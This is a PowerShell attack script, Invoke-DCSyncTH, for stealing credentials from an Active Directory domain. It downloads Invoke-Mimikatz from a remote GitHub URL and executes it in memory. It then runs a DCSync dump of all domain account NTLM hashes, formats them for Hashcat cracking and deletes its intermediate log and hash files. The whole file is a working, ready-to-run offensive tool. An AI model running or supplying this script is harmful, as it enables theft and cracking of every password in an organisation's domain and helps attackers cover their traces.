Function Invoke-DCSyncTH {

param (
    [string]$Domain = $env:USERDNSDOMAIN,
    [string]$OutputToFile = "N",
    [string]$OutputFileName = "Hashcat_Final.txt",
    [string]$OutputFilePath = "$Temp",
    [string]$ComputerHashes = "N"
)

$PATH = "$HOME\"
$LOGFILE = $PATH + "Log.txt"
$HASHES = $PATH  + "Hashes.txt"
$USERS = $PATH + "Users.txt"
$HASHCATFILE = $PATH + "Hashcat.txt"

Write-Host ""
Write-Host ""
Write-Host "[-] Downloading Mimikatz into Memory"
IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')

Write-Host "[-] DCSync will be executed against the Domain: $Domain"
Write-Host "[-] Only User accounts will be extracted"

Write-Host "[!] Executing Mimikatz" -ForegroundColor Yellow
$Command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
Invoke-Mimikatz -Command $Command | Out-Null

If ($ComputerHashes -eq "Y")
{
(Get-Content -LiteralPath $LOGFILE) | ForEach-Object {$_.Split("`t")[2]} > $HASHES
(Get-Content -LiteralPath $LOGFILE) | ForEach-Object {$_.Split("`t")[1]} > $USERS
}

else

{
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
}

Remove-Item $HASHCATFILE -Force -ErrorAction "SilentlyContinue" | Out-Null
Start-Sleep -Seconds "3"

$File1 = Get-Content $USERS
$File2 = Get-Content $HASHES
for($i = 0; $i -lt $File1.Count; $i++)
{
    ('{0},{1}' -f $File1[$i],$File2[$i]) | Add-Content $HASHCATFILE -Force
}

Remove-Item -Path $LOGFILE
Remove-Item -Path $HASHES
Remove-Item -Path $USERS     

$Lines = Get-Content -Path $HASHCATFILE
$lineCount = ($Lines | Measure-Object -Line).Lines
Write-Host "[+] A total of [$lineCount] hashes have been extracted" -ForegroundColor Green
Write-Host ""

$file_content = Get-Content -Path $HASHCATFILE
If ($OutputToFile -eq "Y"){New-Item -Path $PATH -Name $OutputFileName -ItemType "File" -Force | Out-Null}
foreach ($line in $file_content) {
    $new_line = $line -replace ",", "::aad3b435b51404eeaad3b435b51404ee:"
    $new_line += ":::"
    Write-Output $new_line
    If ($OutputToFile -eq "Y"){Add-Content -Path $Path\$OutputFileName -Value $new_line}
}

Remove-Item -Path $HASHCATFILE -Force | Out-Null
Write-Host ""

}
